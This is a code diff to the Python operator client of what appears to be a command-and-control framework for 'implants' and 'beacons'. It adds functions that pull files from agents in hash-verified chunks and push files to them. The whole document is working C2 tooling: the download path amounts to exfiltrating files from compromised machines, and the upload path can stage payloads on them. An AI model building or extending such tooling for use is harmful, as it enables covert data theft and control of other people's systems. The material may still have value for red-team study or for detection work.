@@ -7,6 +7,8 @@ frame format the implants use.
 
 from __future__ import annotations
 
+import hashlib
+import os
 import queue
 import socket
 import threading
@@ -15,7 +17,11 @@ from typing import Any, Callable, Dict, List, Optional
 
 from . import crypto, handshake, netio, session, upk, wire
 
-__all__ = ["OperatorClient", "OperatorError", "RpcResult"]
+__all__ = ["OperatorClient", "OperatorError", "RpcResult", "CHUNK_MAX"]
+
+# One transfer step never asks for more than the beacon's output budget (900 KiB,
+# see implant/rust/src/task.rs), so each chunk fits in a single RESULT frame.
+CHUNK_MAX = 900 * 1024
 
 
 class OperatorError(Exception):
@@ -278,6 +284,127 @@ class OperatorClient:
         res = self.rpc("agents.sleep", {"id": agent_id, "sleep": sleep, "jitter": jitter})
         if not res.ok:
             raise OperatorError(res.error)
+
+    # -- chunked file transfer -------------------------------------------
+    def _run_transfer_step(self, agent_id: str, kind: str, args: Dict[str, Any], timeout: float) -> Dict[str, Any]:
+        task_id = self.submit(agent_id, kind, args)
+        task = self.wait_for_result(task_id, timeout=timeout)
+        if task.get("state") != "done":
+            raise OperatorError(str(task.get("err") or f"{kind} failed ({task.get('state')})"))
+        return task
+
+    def download_file(
+        self,
+        agent_id: str,
+        remote: str,
+        local: str,
+        *,
+        timeout: float = 120.0,
+        chunk: int = CHUNK_MAX,
+        progress: Optional[Callable[[int, int], None]] = None,
+    ) -> Dict[str, Any]:
+        """Pull `remote` from an agent to `local` in verified chunks.
+
+        The file is written to ``local + ".part"`` and renamed only after every
+        chunk hash and the final size check pass, so a failed or interrupted
+        transfer never leaves a plausible-looking truncated file behind.
+        """
+        chunk = max(1, min(int(chunk), CHUNK_MAX))
+        tmp = local + ".part"
+        offset = 0
+        total = -1
+        digest = hashlib.sha256()
+        try:
+            with open(tmp, "wb") as fh:
+                while True:
+                    task = self._run_transfer_step(
+                        agent_id,
+                        "download",
+                        {"path": remote, "offset": offset, "limit": chunk},
+                        timeout,
+                    )
+                    data = task.get("out") or b""
+                    if isinstance(data, str):
+                        data = data.encode("utf-8", "surrogateescape")
+                    data = bytes(data)
+                    meta = task.get("meta") or {}
+                    expected = str(meta.get("sha256", ""))
+                    if expected and hashlib.sha256(data).hexdigest() != expected:
+                        raise OperatorError(f"chunk at offset {offset} failed its hash check")
+                    fh.write(data)
+                    digest.update(data)
+                    offset += len(data)
+                    if meta.get("total") is not None:
+                        total = int(meta["total"])
+                    if progress is not None:
+                        progress(offset, total)
+                    eof = bool(meta.get("eof", not data))
+                    if eof or not data:
+                        break
+        except BaseException:
+            try:
+                os.unlink(tmp)
+            except OSError:
+                pass
+            raise
+        if total >= 0 and offset != total:
+            try:
+                os.unlink(tmp)
+            except OSError:
+                pass
+            raise OperatorError(f"short transfer: got {offset} of {total} bytes")
+        os.replace(tmp, local)
+        return {
+            "path": remote,
+            "local": local,
+            "bytes": offset,
+            "sha256": digest.hexdigest(),
+            "chunks": (offset + chunk - 1) // chunk,
+        }
+
+    def upload_file(
+        self,
+        agent_id: str,
+        local: str,
+        remote: str,
+        *,
+        timeout: float = 120.0,
+        chunk: int = CHUNK_MAX,
+        progress: Optional[Callable[[int, int], None]] = None,
+    ) -> Dict[str, Any]:
+        """Push `local` to an agent in chunks, verified by a whole-file hash."""
+        chunk = max(1, min(int(chunk), CHUNK_MAX))
+        with open(local, "rb") as fh:
+            blob = fh.read()
+        total = len(blob)
+        digest = hashlib.sha256(blob).hexdigest()
+        offset = 0
+        remote_hash = ""
+        while True:
+            piece = blob[offset : offset + chunk]
+            eof = offset + len(piece) >= total
+            task = self._run_transfer_step(
+                agent_id,
+                "upload",
+                {"path": remote, "offset": offset, "data": piece, "eof": eof},
+                timeout,
+            )
+            meta = task.get("meta") or {}
+            remote_hash = str(meta.get("sha256", "")) or remote_hash
+            offset += len(piece)
+            if progress is not None:
+                progress(offset, total)
+            if eof:
+                break
+        if remote_hash and remote_hash != digest:
+            raise OperatorError(f"remote file hash {remote_hash} != local {digest}")
+        return {
+            "path": remote,
+            "local": local,
+            "bytes": total,
+            "sha256": digest,
+            "chunks": max(1, (total + chunk - 1) // chunk),
+        }
 
     def wait_for_result(self, task_id: str, timeout: float = 60.0, poll: float = 1.0) -> Dict[str, Any]:
         """Poll until a task leaves the queued/delivered state."""
